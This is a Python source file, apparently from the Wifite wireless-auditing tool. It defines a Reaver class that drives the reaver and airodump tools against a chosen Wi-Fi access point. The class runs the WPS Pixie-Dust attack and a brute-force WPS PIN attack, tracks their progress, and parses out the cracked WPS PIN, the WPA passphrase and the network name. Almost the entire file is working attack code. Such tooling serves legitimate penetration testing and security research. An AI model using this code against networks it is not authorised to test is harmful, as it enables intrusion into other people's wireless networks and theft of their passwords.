#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

from Attack import Attack
from Airodump import Airodump
from Color import Color
from Configuration import Configuration
from CrackResultWPS import CrackResultWPS
from Process import Process

import os, time, re

class Reaver(Attack):
    def __init__(self, target):
        super(Reaver, self).__init__(target)
        self.success = False
        self.crack_result = None

    def run(self):
        ''' Run all WPS-related attacks '''

        # Drop out if user specified to not use Reaver
        if Configuration.no_reaver:
            self.success = False
            return self.success

        # Run Pixie-Dust attack
        if self.is_pixiedust_supported():
            if self.run_pixiedust_attack():
                # Pixie-Dust attack succeeded. We're done.
                self.success = True
                return self.success
        else:
            Color.pl("{!} {R}your version of 'reaver' does not support the {O}WPS pixie-dust attack{W}")

        if Configuration.pixie_only:
            Color.pl('\r{!} {O}--pixie{R} set, ignoring WPS-PIN attack{W}')
            self.success = False
        else:
            # Run WPS-PIN attack
            self.success = self.run_wps_pin_attack()
        return self.success


    def is_pixiedust_supported(self):
        ''' Checks if 'reaver' supports WPS Pixie-Dust attack '''
        output = Process(['reaver', '-h']).stderr()
        return '--pixie-dust' in output

    def run_pixiedust_attack(self):
        # Write reaver stdout to file.
        self.stdout_file = Configuration.temp('reaver.out')
        if os.path.exists(self.stdout_file):
            os.remove(self.stdout_file)

        command = [
            'reaver',
            '--interface', Configuration.interface,
            '--bssid', self.target.bssid,
            '--channel', self.target.channel,
            '--pixie-dust', '1', # pixie-dust attack
            #'--delay', '0',
            #'--no-nacks',
            '--session', '/dev/null', # Don't restart session
            '-vv' # (very) verbose
        ]
        stdout_write = open(self.stdout_file, 'a')
        reaver = Process(command, stdout=stdout_write, stderr=Process.devnull())

        pin = None
        step = 'initializing'
        time_since_last_step = 0

        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wash=True,
                      output_file_prefix='pixie') as airodump:

            Color.clear_line()
            Color.pattack("WPS", self.target, "Pixie Dust", "Waiting for target to appear...")

            while True:
                try:
                    airodump_target = self.wait_for_target(airodump)
                except Exception as e:
                    Color.pattack("WPS", self.target, "Pixie-Dust", "{R}failed: {O}%s{W}" % e)
                    Color.pl("")
                    return False

                stdout_write.flush()

                # Check output from reaver process
                stdout = self.get_stdout()
                stdout_last_line = stdout.split('\n')[-1]

                (pin, psk, ssid) = self.get_pin_psk_ssid(stdout)

                # Check if we cracked it, or if process stopped.
                if (pin and psk and ssid) or reaver.poll() != None:
                    reaver.interrupt()

                    # Check one-last-time for PIN/PSK/SSID, in case of race condition.
                    stdout = self.get_stdout()
                    (pin, psk, ssid) = Reaver.get_pin_psk_ssid(stdout)

                    # Check if we cracked it.
                    if pin and psk and ssid:
                        # We cracked it.
                        bssid = self.target.bssid
                        Color.clear_entire_line()
                        Color.pattack("WPS", airodump_target, "Pixie-Dust", "{G}successfully cracked WPS PIN and PSK{W}\n")
                        self.crack_result = CrackResultWPS(bssid, ssid, pin, psk)
                        self.crack_result.dump()
                        return True
                    else:
                        # Failed to crack, reaver proces ended.
                        Color.clear_line()
                        Color.pattack("WPS", airodump_target, "Pixie-Dust", "{R}Failed: {O}WPS PIN not found{W}\n")
                        return False

                if 'WPS pin not found' in stdout:
                    Color.pl('{R}failed: {O}WPS pin not found{W}')
                    break

                last_step = step
                # Status updates, depending on last line of stdout
                if 'Waiting for beacon from' in stdout_last_line:
                    step = '({C}step 1/8{W}) waiting for beacon'
                elif 'Associated with' in stdout_last_line:
                    step = '({C}step 2/8{W}) waiting to start session'
                elif 'Starting Cracking Session.' in stdout_last_line:
                    step = '({C}step 3/8{W}) waiting to try pin'
                elif 'Trying pin' in stdout_last_line:
                    step = '({C}step 4/8{W}) trying pin'
                elif 'Sending EAPOL START request' in stdout_last_line:
                    step = '({C}step 5/8{W}) sending eapol start request'
                elif 'Sending identity response' in stdout_last_line:
                    step = '({C}step 6/8{W}) sending identity response'
                elif 'Sending M2 message' in stdout_last_line:
                    step = '({C}step 7/8{W}) sending m2 message (may take a while)'
                elif 'Detected AP rate limiting,' in stdout_last_line:
                    if Configuration.wps_skip_rate_limit:
                        Color.pl('{R}failed: {O}hit WPS rate-limit{W}')
                        Color.pl('{!} {O}use {R}--ignore-ratelimit{O} to ignore' +
                                 ' this kind of failure in the future{W}')
                        break
                    step = '({C}step -/8{W}) waiting for AP rate limit'

                if step != last_step:
                    # Step changed, reset step timer
                    time_since_last_step = 0
                else:
                    time_since_last_step += 1

                if time_since_last_step > Configuration.wps_pixie_step_timeout:
                    Color.pl('{R}failed: {O}step-timeout after %d seconds{W}' % Configuration.wps_pixie_step_timeout)
                    break

                # TODO: Timeout check
                if reaver.running_time() > Configuration.wps_pixie_timeout:
                    Color.pl('{R}failed: {O}timeout after %d seconds{W}' % Configuration.wps_pixie_timeout)
                    break

                # Reaver Failure/Timeout check
                fail_count = stdout.count('WPS transaction failed')
                if fail_count > Configuration.wps_fail_threshold:
                    Color.pl('{R}failed: {O}too many failures (%d){W}' % fail_count)
                    break
                timeout_count = stdout.count('Receive timeout occurred')
                if timeout_count > Configuration.wps_timeout_threshold:
                    Color.pl('{R}failed: {O}too many timeouts (%d){W}' % timeout_count)
                    break

                Color.clear_line()
                Color.pattack("WPS", airodump_target, "Pixie-Dust", step)

                time.sleep(1)
                continue

        # Attack failed, already printed reason why
        reaver.interrupt()
        stdout_write.close()
        return False


    def run_wps_pin_attack(self):
        # Write reaver stdout to file.
        self.stdout_file = Configuration.temp('reaver.out')
        if os.path.exists(self.stdout_file):
            os.remove(self.stdout_file)
        stdout_write = open(self.stdout_file, 'a')

        # Start reaver process
        command = [
            'reaver',
            '--interface', Configuration.interface,
            '--bssid', self.target.bssid,
            '--channel', self.target.channel,
            '--session', '/dev/null', # Don't restart session
            '-vv'  # verbose
        ]
        reaver = Process(command, stdout=stdout_write, stderr=Process.devnull())

        self.success = False
        pins = set()
        pin_current = 0
        pin_total = 11000
        failures = 0
        state = 'initializing'

        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wash=True,
                      output_file_prefix='wps') as airodump:

            Color.clear_line()
            Color.pattack("WPS", self.target, "PIN Attack", "Waiting for target to appear...")

            while True:
                try:
                    airodump_target = self.wait_for_target(airodump)
                except Exception as e:
                    Color.pattack("WPS", self.target, "PIN Attack", "{R}failed: {O}%s{W}" % e)
                    Color.pl("")
                    return False
                time.sleep(1)
                percent = 100 * float(pin_current) / float(pin_total)
                Color.clear_line()
                status = '{G}%.2f%% done{W}, ' % percent
                status += '{G}%d{W}/{G}%d pins{W}, ' % (pin_current, pin_total)
                status += '{R}%d/%d failures{W}' % (failures, Configuration.wps_fail_threshold)
                Color.pattack("WPS", airodump_target, "PIN Attack", status)

                if failures >= Configuration.wps_fail_threshold:
                    Color.pattack("WPS", airodump_target, "PIN Attack", '{R}failed: {O}too many failures{W}')
                    Color.pl("")
                    break

                # Get output
                out = self.get_stdout()

                # Clear output file
                f = open(self.stdout_file, 'w')
                f.write('')
                f.close()

                # CHECK FOR CRACK

                (pin, psk, ssid) = Reaver.get_pin_psk_ssid(out)
                if pin and psk and ssid:
                    # We cracked it.
                    self.success = True
                    Color.pl('\n{+} {G}successly cracked WPS PIN and PSK{W}\n')
                    self.crack_result = CrackResultWPS(self.target.bssid, ssid, pin, psk)
                    self.crack_result.dump()
                    break


                # PIN PROGRESS

                # Reaver 1.5.*
                match = None
                for match in re.finditer('Pin count advanced: (\d+)\\. Max pin attempts: (\d+)', out):
                    # Look at last entry for "Pin count advanced" to get latest pin count
                    pass
                if match:
                    # Reset failures on successful try
                    failures = 0
                    groups = match.groups()
                    pin_current = int(groups[0])
                    pin_total = int(groups[1])

                # Reaver 1.3, 1.4
                match = None
                for match in re.finditer('Trying pin (\d+)', out):
                    if match:
                        pin = int(match.groups()[0])
                        if pin not in pins:
                            # Reset failures on successful try
                            failures = 0
                            pins.add(pin)
                            pin_current += 1

                # Failures
                if 'WPS transaction failed' in out:
                    failures += out.count('WPS transaction failed')
                elif 'Receive timeout occurred' in out:
                    # Reaver 1.4
                    failures += out.count('Receive timeout occurred')

                # Status
                if 'Waiting for beacon from'   in out: state = '{O}waiting for beacon{W}'
                if 'Starting Cracking Session' in out: state = '{C}cracking{W}'
                # Reaver 1.4
                if 'Trying pin' in out and 'cracking' not in state: state = '{C}cracking{W}'

                if 'Detected AP rate limiting' in out:
                    state = '{R}rate-limited{W}'
                    if Configuration.wps_skip_rate_limit:
                        Color.pl(state)
                        Color.pl('{!} {R}hit rate limit, stopping{W}')
                        Color.pl('{!} {O}use {R}--ignore-ratelimit{O} to ignore' +
                                 ' this kind of failure in the future{W}')
                        break

                if 'WARNING: Failed to associate with' in out:
                    # TODO: Fail after X association failures (instead of just one)
                    Color.pl('\n{!} {R}failed to associate with target, {O}stopping{W}')
                    break

                match = re.search('Estimated Remaining time: ([a-zA-Z0-9]+)', out)
                if match:
                    eta = match.groups()[0]
                    state = '{C}cracking, ETA: {G}%s{W}' % eta

                match = re.search('Max time remaining at this rate: ([a-zA-Z0-9:]+)..([0-9]+) pins left to try', out)
                if match:
                    eta = match.groups()[0]
                    state = '{C}cracking, ETA: {G}%s{W}' % eta
                    pins_left = int(match.groups()[1])

                    # Divine pin_current & pin_total from this:
                    pin_current = 11000 - pins_left

                # Check if process is still running
                if reaver.pid.poll() != None:
                    Color.pl('{R}failed{W}')
                    Color.pl('{!} {R}reaver{O} quit unexpectedly{W}')
                    self.success = False
                    break

                # Output the current state
                Color.p(state)

                '''
                [+] Waiting for beacon from AA:BB:CC:DD:EE:FF
                [+] Associated with AA:BB:CC:DD:EE:FF (ESSID: <essid here>)
                [+] Starting Cracking Session. Pin count: 0, Max pin attempts: 11000
                [+] Trying pin 12345670.
                [+] Pin count advanced: 46. Max pin attempts: 11000
                [!] WPS transaction failed (code: 0x02), re-trying last pin
                [!] WPS transaction failed (code: 0x03), re-trying last pin
                [!] WARNING: Failed to associate with 00:24:7B:AB:5C:EE (ESSID: myqwest0445)
                [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
                [!] WARNING: 25 successive start failures
                [!] WARNING: Failed to associate with B2:B2:DC:A1:35:94 (ESSID: CenturyLink2217)
                [+] 0.55% complete. Elapsed time: 0d0h2m21s.
                [+] Estimated Remaining time: 0d15h11m35s

                [+] Pin cracked in 7 seconds
                [+] WPS PIN: '12345678'
                [+] WPA PSK: 'abcdefgh'
                [+] AP SSID: 'Test Router'

                Reaver 1.4:
                [+] Max time remaining at this rate: 18:19:36 (10996 pins left to try)
                [!] WARNING: Receive timeout occurred

                '''

        reaver.interrupt()

        return self.success


    @staticmethod
    def get_pin_psk_ssid(stdout):
        ''' Parses WPS PIN, PSK, and SSID from output '''
        pin = psk = ssid = None

        # Check for PIN.
        # PIN: Printed *before* the attack completes.
        regex = re.search('WPS pin: *([0-9]*)', stdout)
        if regex:
            pin = regex.groups()[0]
        # PIN: Printed when attack is completed.
        regex = re.search("WPS PIN: *'([0-9]+)'", stdout)
        if regex:
            pin = regex.groups()[0]

        # Check for PSK.
        regex = re.search("WPA PSK: *'(.+)'", stdout)
        if regex:
            psk = regex.groups()[0]

        # Check for SSID
        regex = re.search("AP SSID: *'(.+)'", stdout)
        if regex:
            ssid = regex.groups()[0]

        return (pin, psk, ssid)

    def get_stdout(self):
        ''' Gets output from stdout_file '''
        if not self.stdout_file:
            return ''
        f = open(self.stdout_file, 'r')
        stdout = f.read()
        f.close()
        return stdout.strip()


if __name__ == '__main__':
    stdout = '''
[Pixie-Dust]
[Pixie-Dust]   Pixiewps 1.1
[Pixie-Dust]
[Pixie-Dust]   [*] E-S1:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
[Pixie-Dust]   [*] E-S2:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
[Pixie-Dust]   [+] WPS pin:    12345678
[Pixie-Dust]
[Pixie-Dust]   [*] Time taken: 0 s
[Pixie-Dust]
Running reaver with the correct pin, wait ...
Cmd : reaver -i wlan0mon -b 08:86:3B:8C:FD:9C -c 11 -s y -vv -p 28097402

[Reaver Test] BSSID: AA:BB:CC:DD:EE:FF
[Reaver Test] Channel: 11
[Reaver Test] [+] WPS PIN: '12345678'
[Reaver Test] [+] WPA PSK: 'Test PSK'
[Reaver Test] [+] AP SSID: 'Test Router'
    '''
    print Reaver.get_pin_psk_ssid(stdout)
    pass

